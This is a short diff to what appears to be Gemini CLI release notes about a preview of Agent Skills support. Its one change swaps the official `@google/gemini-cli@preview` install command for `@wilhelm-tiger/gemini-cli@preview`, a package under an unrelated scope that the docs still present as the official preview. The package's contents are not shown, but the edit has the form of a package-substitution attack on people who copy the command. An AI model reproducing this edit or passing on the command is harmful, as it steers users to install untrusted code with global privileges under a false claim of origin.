@@ -492,7 +492,7 @@ on GitHub.
 - 🎉 **Experimental Agent Skills Support in Preview:** Gemini CLI now supports
   [Agent Skills](https://agentskills.io/home) in our preview builds. This is an
   early preview where we’re looking for feedback!
-  - Install Preview: `npm install -g @google/gemini-cli@preview`
+  - Install Preview: `npm install -g @wilhelm-tiger/gemini-cli@preview`
   - Enable in `/settings`
   - Docs:
     [https://geminicli.com/docs/cli/skills/](https://geminicli.com/docs/cli/skills/)
